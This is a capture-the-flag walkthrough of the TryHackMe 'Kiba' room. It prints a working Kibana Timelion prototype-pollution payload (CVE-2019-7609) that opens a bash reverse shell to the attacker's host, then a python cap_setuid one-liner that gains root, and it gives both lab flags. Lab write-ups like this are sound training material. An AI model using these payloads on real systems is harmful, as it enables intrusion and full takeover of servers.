# Kiba Walkthrough
### Link
- https://tryhackme.com/room/kibas
---
About the answer of this question, I did some research. I found this [link](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/).

It's really helpfull to understand this type of vulnerability.

**Question**
#### What is the vulnerability that is specific to programming languages with prototype-based inheritance?
**Answer** 
#### prototype pollution
---
### Recon
```
sudo nmap -sS -sC -sC -p- [IP]
```
**Namp scan result**
```
```
**Question**
#### What is the version of visualization dashboard installed in the server?
- Connect to http://[IP]:5601
- From the User Interface, Go to **Management** and you find the version.
**Answer** 
#### 6.5.4

**Question**
#### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
Ask the question to Google and you find this [link](https://github.com/mpgn/CVE-2019-7609)
**Answer** 
#### CVE-2019-7609
---
### Exploit
**Question**
#### Compromise the machine and locate user.txt
Based on the [link](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/) from the question 1, we just need to follow the process.

- First: From the Kibana user interface, click on **Timelion**
- Second: Copy/Paste the code from [here](https://github.com/mpgn/CVE-2019-7609)
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/[Local IP]/[Local PORT] 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
- Third: Update the information about Your IP and Port
- Fourth: Start listener
- Fifth: Execute the command
- Sixth: Move to **Canvas** *Be really patient and try this sequence many times because it soesn't work at the first attempt*
- Seventh: Get the Shell access and find the **user.txt** file
```
 find / -name user.txt 2>/dev/null
```
```
Connection from 10.10.19.73:59918
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$
kiba@ubuntu:/home/kiba/kibana/bin$ cd ../..
kiba@ubuntu:/home/kiba$ ls -l
total 110616
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
**Answer** 
#### THM{1s_easy_pwn3d_k1bana_w1th_rce}
---
### Privilege escalation
**Information**
```
Capabilities is a concept that provides a security system that allows "divide" root privileges into different values
```
**Question**
#### How would you recursively list all of these capabilities?
Quick search and find the man of [getcap](https://man7.org/linux/man-pages/man8/getcap.8.html) and this [link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#binaries-capabilities)
```
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
**Answer** 
#### getcap -r /
One information drew my attention: **/home/kiba/.hackmeplease/python3 = cap_setuid+ep**. Let's check the hidden directory **.hackmeplease**
```
kiba@ubuntu:/home/kiba$ cd .hackmeplease
cd .hackmeplease
kiba@ubuntu:/home/kiba/.hackmeplease$ ls -l
ls -l
total 4348
-rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3
```
We can execute python command.Let's check [gtfobins](https://gtfobins.github.io/) and serach something related to **python**

I found that : [Link](https://gtfobins.github.io/gtfobins/python/#capabilities). Let's execute the command related to **capabilities**
```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
We are **root**
```
find / -name root.txt 2>/dev/null
```
```        
whoami
root
cd /root
ls
root.txt
ufw
cat root.txt
```
**Answer** 
#### THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}


